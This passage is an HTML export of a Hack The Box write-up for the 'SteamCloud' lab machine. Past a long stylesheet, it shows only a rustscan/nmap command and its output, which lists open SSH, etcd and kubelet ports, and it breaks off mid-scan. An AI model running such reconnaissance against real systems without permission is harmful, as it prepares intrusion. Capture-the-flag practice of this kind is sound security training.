@@ -1,0 +1,1387 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Steam Cloud</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="e59d26e5-c42a-4e4b-aa97-f4a9053a3e22" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="Steam%20Clou%2088e7c/ste-removebg-preview.png"/></div><h1 class="page-title">Steam Cloud</h1><table class="properties"><tbody><tr class="property-row property-row-text"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesText"><path d="M7,4.56818 C7,4.29204 6.77614,4.06818 6.5,4.06818 L0.5,4.06818 C0.223858,4.06818 0,4.29204 0,4.56818 L0,5.61364 C0,5.88978 0.223858,6.11364 0.5,6.11364 L6.5,6.11364 C6.77614,6.11364 7,5.88978 7,5.61364 L7,4.56818 Z M0.5,1 C0.223858,1 0,1.223858 0,1.5 L0,2.54545 C0,2.8216 0.223858,3.04545 0.5,3.04545 L12.5,3.04545 C12.7761,3.04545 13,2.8216 13,2.54545 L13,1.5 C13,1.223858 12.7761,1 12.5,1 L0.5,1 Z M0,8.68182 C0,8.95796 0.223858,9.18182 0.5,9.18182 L11.5,9.18182 C11.7761,9.18182 12,8.95796 12,8.68182 L12,7.63636 C12,7.36022 11.7761,7.13636 11.5,7.13636 L0.5,7.13636 C0.223858,7.13636 0,7.36022 0,7.63636 L0,8.68182 Z M0,11.75 C0,12.0261 0.223858,12.25 0.5,12.25 L9.5,12.25 C9.77614,12.25 10,12.0261 10,11.75 L10,10.70455 C10,10.4284 9.77614,10.20455 9.5,10.20455 L0.5,10.20455 C0.223858,10.20455 0,10.4284 0,10.70455 L0,11.75 Z"></path></svg></span>OS</th><td>Linux</td></tr><tr class="property-row property-row-text"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesText"><path d="M7,4.56818 C7,4.29204 6.77614,4.06818 6.5,4.06818 L0.5,4.06818 C0.223858,4.06818 0,4.29204 0,4.56818 L0,5.61364 C0,5.88978 0.223858,6.11364 0.5,6.11364 L6.5,6.11364 C6.77614,6.11364 7,5.88978 7,5.61364 L7,4.56818 Z M0.5,1 C0.223858,1 0,1.223858 0,1.5 L0,2.54545 C0,2.8216 0.223858,3.04545 0.5,3.04545 L12.5,3.04545 C12.7761,3.04545 13,2.8216 13,2.54545 L13,1.5 C13,1.223858 12.7761,1 12.5,1 L0.5,1 Z M0,8.68182 C0,8.95796 0.223858,9.18182 0.5,9.18182 L11.5,9.18182 C11.7761,9.18182 12,8.95796 12,8.68182 L12,7.63636 C12,7.36022 11.7761,7.13636 11.5,7.13636 L0.5,7.13636 C0.223858,7.13636 0,7.36022 0,7.63636 L0,8.68182 Z M0,11.75 C0,12.0261 0.223858,12.25 0.5,12.25 L9.5,12.25 C9.77614,12.25 10,12.0261 10,11.75 L10,10.70455 C10,10.4284 9.77614,10.20455 9.5,10.20455 L0.5,10.20455 C0.223858,10.20455 0,10.4284 0,10.70455 L0,11.75 Z"></path></svg></span>IP</th><td>10.10.11.133</td></tr><tr class="property-row property-row-checkbox"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCheckbox"><path d="M0,3 C0,1.34314 1.34326,0 3,0 L11,0 C12.6567,0 14,1.34314 14,3 L14,11 C14,12.6569 12.6567,14 11,14 L3,14 C1.34326,14 0,12.6569 0,11 L0,3 Z M3,1.5 C2.17139,1.5 1.5,2.17157 1.5,3 L1.5,11 C1.5,11.8284 2.17139,12.5 3,12.5 L11,12.5 C11.8286,12.5 12.5,11.8284 12.5,11 L12.5,3 C12.5,2.17157 11.8286,1.5 11,1.5 L3,1.5 Z M2.83252,6.8161 L3.39893,6.27399 L3.57617,6.10425 L3.92334,5.77216 L4.26904,6.10559 L4.44531,6.27582 L5.58398,7.37402 L9.28271,3.81073 L9.45996,3.64008 L9.80664,3.3056 L10.1538,3.63989 L10.3311,3.81067 L10.8936,4.35303 L11.0708,4.52399 L11.4434,4.88379 L11.0708,5.24353 L10.8936,5.41437 L6.1084,10.0291 L5.93115,10.2 L5.58398,10.5344 L5.23682,10.2 L5.05957,10.0292 L2.83057,7.87946 L2.65283,7.70801 L2.27832,7.34674 L2.6543,6.98694 L2.83252,6.8161 Z"></path></svg></span>Complete</th><td><div class="checkbox checkbox-on"></div></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesSelect"><path d="M7,13 C10.31348,13 13,10.31371 13,7 C13,3.68629 10.31348,1 7,1 C3.68652,1 1,3.68629 1,7 C1,10.31371 3.68652,13 7,13 Z M3.75098,5.32278 C3.64893,5.19142 3.74268,5 3.90869,5 L10.09131,5 C10.25732,5 10.35107,5.19142 10.24902,5.32278 L7.15771,9.29703 C7.07764,9.39998 6.92236,9.39998 6.84229,9.29703 L3.75098,5.32278 Z"></path></svg></span>OSCP</th><td><span class="selected-value select-value-color-yellow">no</span></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesSelect"><path d="M7,13 C10.31348,13 13,10.31371 13,7 C13,3.68629 10.31348,1 7,1 C3.68652,1 1,3.68629 1,7 C1,10.31371 3.68652,13 7,13 Z M3.75098,5.32278 C3.64893,5.19142 3.74268,5 3.90869,5 L10.09131,5 C10.25732,5 10.35107,5.19142 10.24902,5.32278 L7.15771,9.29703 C7.07764,9.39998 6.92236,9.39998 6.84229,9.29703 L3.75098,5.32278 Z"></path></svg></span>Status</th><td><span class="selected-value select-value-color-red">Cracked</span></td></tr></tbody></table></header><div class="page-body"><figure id="39953f06-6f1e-4e92-ad27-64293be68a18"><a href="https://app.hackthebox.com/profile/355204" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Hack The Box</div></div><div class="bookmark-href"><img src="https://app.hackthebox.com/images/HTB-favicon/favicon.ico" class="icon bookmark-icon"/>https://app.hackthebox.com/profile/355204</div></div></a><figcaption>Profile</figcaption></figure><p id="a46b3bcf-8095-42d4-8d66-b41c1b33a63f" class="">
+</p><figure id="33ca9044-359f-43c6-bead-69861b17f898"><a href="https://kshitijraj.vercel.app/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Kshitij Protfolio Website</div><div class="bookmark-description">CyberSecurity Enthusiast and Researcher Tweaking around machine and finding a way to inside them. Basically I do Pentesting and do research on bugs . I do CTF challanges on different platform , learn about different vulnerability and trying to contribute to make cyberspace a safe place .</div></div><div class="bookmark-href"><img src="https://kshitijraj.vercel.app/favicon/favicon-16x16.png" class="icon bookmark-icon"/>https://kshitijraj.vercel.app/</div></div><img src="https://kshitijraj.vercel.app/img/Kshitij2%20(Custom).jpg" class="bookmark-image"/></a></figure><h1 id="dc4030e5-a32c-4103-8424-8ea717f4328d" class="">1.Port Scanning</h1><pre id="04b5b0be-eef1-445d-b526-9ed6010f6e40" class="code"><code>rustscan -a steamcloud.htb -- -sC -sV</code></pre><p id="14dc71f7-8b7c-46e5-9db5-1c7905a15693" class="">Found  7 ports </p><pre id="cab3f906-eb92-4e7f-8067-df6f05ed5182" class="code"><code>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Real hackers hack time ⌛
+
+[~] The config file is expected to be at &quot;/home/ezio/.rustscan.toml&quot;
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. 
+Open 10.10.11.133:22
+Open 10.10.11.133:2379
+Open 10.10.11.133:2380
+Open 10.10.11.133:8443
+Open 10.10.11.133:10249
+Open 10.10.11.133:10250
+Open 10.10.11.133:10256
+[~] Starting Script(s)
+[&gt;] Script to be run Some(&quot;nmap -vvv -p {{port}} {{ip}}&quot;)
+
+[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 18:26 GMT
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 18:26
+Completed NSE at 18:26, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 18:26
+Completed NSE at 18:26, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 18:26
+Completed NSE at 18:26, 0.00s elapsed
+Initiating Ping Scan at 18:26
+Scanning 10.10.11.133 [2 ports]
+Completed Ping Scan at 18:26, 0.27s elapsed (1 total hosts)
+Initiating Connect Scan at 18:26
+Scanning steamcloud.htb (10.10.11.133) [7 ports]
+Discovered open port 22/tcp on 10.10.11.133
+Discovered open port 8443/tcp on 10.10.11.133
+Discovered open port 10249/tcp on 10.10.11.133
+Discovered open port 10256/tcp on 10.10.11.133
+Discovered open port 2379/tcp on 10.10.11.133
+Discovered open port 10250/tcp on 10.10.11.133
+Discovered open port 2380/tcp on 10.10.11.133
+Completed Connect Scan at 18:26, 0.23s elapsed (7 total ports)
+Initiating Service scan at 18:26
+Scanning 7 services on steamcloud.htb (10.10.11.133)
+Completed Service scan at 18:28, 109.47s elapsed (7 services on 1 host)
+NSE: Script scanning 10.10.11.133.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 18:28
+Completed NSE at 18:28, 8.86s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 18:28
+Completed NSE at 18:28, 2.21s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 18:28
+Completed NSE at 18:28, 0.00s elapsed
+Nmap scan report for steamcloud.htb (10.10.11.133)
+Host is up, received conn-refused (0.24s latency).
+Scanned at 2022-02-24 18:26:44 GMT for 120s
+
+PORT      STATE SERVICE          REASON  VERSION
+22/tcp    open  ssh              syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCu4TNCZjLe74tZ0HyspkMaghndsvuXkZJa4lJBt9arqgkm6u2HI/RRdwbjE14au2u/YF89y23Q55iOGraA+9JjpyTzDPo3kxE/RisYzJaUDmzza+hqEeyTxXkZby9+DAhKm5UXs7M2CMDr3cwOPPQ96u/zUX0gDG3CfYw4fAi2TDGa6jU5KmGzIQz6SQR3Bv6IYLDwzNJ0nHNZ3jxSbFS3SsmTwK749GJLrv62wAf4uUL/Ihynl8cCG5aor6T0Fk44v/9ndfujznBvWaMYVPpf9B49XlD7OhXB5pCK2nPZrdze+ch6yhAM/vYrYA4sNk3IuFG3OCrDkVeUJn5sJKx5
+|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHVj7iKnl8SWdGz6J4F3kvpZjM1Tim0iHlUnQByS8xJYnfwttLxVwGb+aaGbRhOJu4mq9y4crwFh50rC9mAEHWo=
+|   256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHXIZpU9XbtZ2zvx8rFEYTfGp+8JCJx5lSiRNEcqUFG8
+2379/tcp  open  ssl/etcd-client? syn-ack
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=steamcloud
+| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
+| Issuer: commonName=etcd-ca
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-02-24T10:00:18
